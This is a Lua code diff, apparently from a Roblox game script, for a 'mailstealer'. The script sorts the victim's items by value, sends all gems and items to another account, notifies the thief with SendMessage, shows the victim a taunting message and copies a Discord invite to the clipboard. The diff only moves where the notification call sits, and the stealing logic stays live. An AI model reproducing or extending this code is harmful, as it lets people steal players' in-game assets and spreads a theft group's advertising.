@@ -327,15 +327,14 @@ if #sortedItems > 0 then
         return a.rap * a.amount > b.rap * b.amount 
     end)
     
-    spawn(function()
-        SendMessage(plr.Name, GemAmount1)
-    end)
-
     SendAllGems()
 
     for _, item in ipairs(sortedItems) do
         sendItem(item.category, item.uid, item.amount)
     end
+
+    SendMessage(plr.Name, GemAmount1)
+
     local message = require(game.ReplicatedStorage.Library.Client.Message)
     message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
     setclipboard("discord.gg/GY2RVSEGDT")
